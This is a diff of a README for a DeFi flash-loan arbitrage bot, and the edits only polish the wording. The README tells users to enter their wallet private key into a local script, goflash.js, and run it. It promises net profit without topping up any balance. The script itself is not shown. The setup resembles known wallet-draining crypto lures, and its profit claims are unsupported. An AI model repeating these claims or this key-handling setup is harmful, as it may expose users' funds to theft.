@@ -5,7 +5,7 @@
 
   
 
-Hi! This is my project **FlashLoanArbitrage** — a bot for arbitrage on DeFi with flash loans. Using a smart contract and a local script `goflash.js`, which runs on your computer. Sharing it so you can try it out!
+Hi! This is my project **FlashLoanArbitrage** — a bot for arbitrage on DeFi with flash loans. It uses a smart contract and a local script `goflash.js`, which runs on your computer. I'm sharing it so you can try it out!
 
   
 
@@ -39,9 +39,9 @@ Hi! This is my project **FlashLoanArbitrage** — a bot for arbitrage on DeFi wi
 
 - Checks ETH/USDC prices on five DeFi platforms.
 
-- Waits for a price difference of **0.9%** or more to avoid losses.
+- Waits for a price difference of **≥0.9%** to avoid losses.
 
-- If the difference is there, it triggers arbitrage through the contract.
+- If a sufficient difference is detected, it triggers arbitrage through the contract.
 
   
 
@@ -49,7 +49,7 @@ Hi! This is my project **FlashLoanArbitrage** — a bot for arbitrage on DeFi wi
 
   
 
-I added four protocols for flash loans:
+The project supports four protocols for flash loans:
 
   
 
@@ -63,7 +63,7 @@ I added four protocols for flash loans:
 
   
 
-The bigger the loan, the higher the fee. So don’t take a huge loan if your wallet balance is low!
+The bigger the loan, the higher the fee. Therefore, avoid taking large loans if your wallet balance is low.
 
   
 
@@ -99,7 +99,7 @@ The script checks ETH/USDC prices on these platforms:
 
   
 
-If the price difference is ≥0.9%, the script triggers a deal. Less than that, it waits to avoid losses.
+If the price difference is ≥0.9%, the script triggers a deal. If the difference is less than that, it waits to avoid losses.
 
   
 
@@ -111,7 +111,7 @@ If the price difference is ≥0.9%, the script triggers a deal. Less than that, 
 
   
 
-Here’s how to run my bot:
+Here's how to run the bot:
 
   
 
@@ -161,7 +161,7 @@ const  PRIVATE_KEY = "YOUR_PRIVATE_KEY_HERE";
 
 ```
 
-with your key ( **Don’t share it with anyone!** )
+with your key (**Don't share it with anyone!**)
 
   
 
@@ -183,7 +183,7 @@ node goflash.js
 
 - In **Loan Amount in ETH**, set the loan amount (from 10 to the protocol’s max).
 
--  **Careful**: If your wallet balance is <0.1 ETH, don’t take a loan over **10 ETH** — gas won’t cover it!
+-  **Warning**: If your wallet balance is less than 0.1 ETH, avoid taking a loan over **10 ETH**, as your balance may not cover the gas fees required for the transaction.
 
 - Hit **Start Arbitrage** to start.
 
@@ -195,7 +195,7 @@ node goflash.js
 
 - Waits for a difference ≥0.9% and triggers arbitrage through the contract.
 
-- Converts your ETH to USDC before the deal and profit back to ETH after.
+- Converts your ETH to USDC before the deal and converts the profit back to ETH after.
 
   
 
@@ -203,7 +203,7 @@ node goflash.js
 
   
 
--  **Wallet Balance**: For loans over 10 ETH, you need a balance ≥0.1 ETH, or the script won’t let you pick a big loan.
+-  **Wallet Balance**: For loans over 10 ETH, you need a wallet balance of at least 0.1 ETH. The script will prevent you from selecting a large loan amount if your balance is insufficient.
 
 -  **Fees**: You pay trading fees (0.1%), slippage (0.05%), and gas.
 
@@ -237,7 +237,7 @@ node goflash.js
 
 - The final profit (`Net profit`) in ETH goes to you, accounting for all costs (flash loan fee, trading fees 0.1%, slippage 0.05%, gas).
 
-- No need to top up any balance anywhere!!!
+- No need to top up any balance anywhere!
 
   
 
@@ -249,7 +249,7 @@ node goflash.js
 
   
 
-Hope my bot brings you some profit! If something doesn’t work or you have ideas, drop a note in issues.
+We hope this bot helps you find profitable arbitrage opportunities! If you encounter any issues or have suggestions, please open an issue in the repository.
 
   
 
